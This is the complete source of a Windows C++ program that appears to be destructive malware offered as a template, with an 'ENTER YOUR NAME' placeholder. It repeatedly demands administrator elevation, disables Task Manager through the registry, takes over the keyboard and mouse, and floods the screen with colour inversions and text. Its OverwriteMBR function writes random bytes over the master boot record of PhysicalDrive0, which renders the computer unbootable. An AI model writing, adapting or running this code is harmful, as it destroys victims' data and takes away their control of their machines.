#include <windows.h>
#include <random>
#include <thread>
#include <string>
#include <cmath>
#define SM_CXSCREEN 0
#define SM_CYSCREEN 1
#define MBR_SIZE 512

typedef enum _PROCESSINFOCLASS {
    ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef NTSTATUS(WINAPI* pNtSetInformationProcess)(HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
    );

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        if (CheckTokenMembership(NULL, adminGroup, &isAdmin) == 0) {
            isAdmin = FALSE;
        }
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}

void RequestAdminPrivileges() {
    if (!IsRunningAsAdmin()) {
        WCHAR szFilePath[MAX_PATH];
        GetModuleFileName(NULL, szFilePath, MAX_PATH);
        ShellExecute(NULL, L"runas", szFilePath, NULL, NULL, SW_SHOWNORMAL);
        ExitProcess(0);
    }
}

void DisableTaskManager() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD dwData = 1;
        RegSetValueEx(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&dwData, sizeof(dwData));
        RegCloseKey(hKey);
    }
}

void SimulateRandomTyping() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 25);
    while (true) {
        char randomChar = 'A' + dis(gen);
        keybd_event(0, 0, KEYEVENTF_SCANCODE, 0);
        keybd_event(0, 0, KEYEVENTF_KEYUP, 0);
        keybd_event(randomChar, 0, KEYEVENTF_SCANCODE, 0);
        keybd_event(randomChar, 0, KEYEVENTF_KEYUP, 0);
        Sleep(rand() % 500 + 100);
    }
}

void DrawEffects(HDC hdc, int screenWidth, int screenHeight) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 224);
    int r = dis(gen), g = dis(gen), b = dis(gen);
    HBRUSH brush = CreateSolidBrush(RGB(r, g, b));
    SelectObject(hdc, brush);
    PatBlt(hdc, 0, 0, screenWidth, screenHeight, PATINVERT);
    DeleteObject(brush);
}

void OverwriteMBR() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) {
        return;
    }
    BYTE mbrData[MBR_SIZE];
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (int i = 0; i < MBR_SIZE; i++)
        mbrData[i] = dis(gen);
    DWORD bytesWritten;
    WriteFile(hDrive, mbrData, MBR_SIZE, &bytesWritten, NULL);
    CloseHandle(hDrive);
}

void DisplayRandomText() {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"ABOLHB"; // ENTER YOUR NAME
    while (true) {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(SM_CXSCREEN);
        sy = GetSystemMetrics(SM_CYSCREEN);
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        Sleep(10);
    }
}

void MoveMouseRandomly() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> disX(0, GetSystemMetrics(SM_CXSCREEN) - 1);
    std::uniform_int_distribution<> disY(0, GetSystemMetrics(SM_CYSCREEN) - 1);

    while (true) {
        SetCursorPos(disX(gen), disY(gen));
        Sleep(rand() % 10 + 50);
    }
}

void MonitorAdminPrivileges() {
    while (true) {
        if (!IsRunningAsAdmin()) {
            RequestAdminPrivileges();
        }
        Sleep(5000);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::thread monitorThread(MonitorAdminPrivileges);
    RequestAdminPrivileges();
    DisableTaskManager();
    std::thread typingThread(SimulateRandomTyping);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    std::thread gdiThread([&]() {
        while (true) {
            DrawEffects(hdc, screenWidth, screenHeight);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        });
    std::thread textThread(DisplayRandomText);
    std::thread mouseThread(MoveMouseRandomly);
    OverwriteMBR();
    gdiThread.join();
    textThread.join();
    mouseThread.join();
    monitorThread.join();
    return 0;
}
